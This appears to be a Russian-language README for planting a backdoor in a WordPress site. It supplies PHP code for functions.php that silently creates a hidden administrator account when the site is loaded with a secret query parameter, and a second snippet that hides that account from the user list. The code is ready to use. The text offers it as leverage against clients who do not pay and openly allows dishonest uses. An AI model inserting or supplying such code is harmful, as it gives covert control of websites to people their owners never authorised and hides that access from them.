# Back Door In Wordpress

Данный материал выкладывается в образовательных целях!
Бывают разные ситуации в жизни, бывают разные заказчики. 
Иногда нужно себя обезопасить от кидалова. 
Да может быть 100 честных причин и столько же нечестных для использования backdoor-а в WordPress.

## Установка ⚙️

1. Измените functions.php сайта вставив/добавив следуйщий код:

```php
add_action( 'wp_head', 'my_backdoor' );

function my_backdoor()
{
    if (md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6b') {
        require('wp-includes/registration.php');
        if (!username_exists('<LOGIN>')) {
         $user_id = wp_create_user('<LOGIN>', '<PASSWORD>');
         $user = new WP_User($user_id);
         $user->set_role('administrator');
        }
    }
}
```
2. Замените <LOGIN> и <PASSWORD> на свой логин и пароль.

> С помощью этого кода мы создаём на сайте нового пользователя *LOGIN* с паролем *PASSWORD* и правами администратора.

> Для активации кода перейдите по ссылке: http://<ВАШСАЙТ>/?backdoor=go

####  Для того, чтобы скрыть нашего нового пользователя из списка пользователей, добавьте в functions.php следующий код:

```php
/**
 * @param $user_search
 */
function w45345p_hide_specific_user($user_search)
{
    global $wpdb;
    $user_search->query_where = str_replace(
        'WHERE 1=1',
        "WHERE 1=1 AND {$wpdb->users}.user_login != '<LOGIN>'",
        $user_search->query_where);
}

add_action('pre_user_query','w45345p_hide_specific_user');
```

После этого можно заходить на сайт с правами администратора.
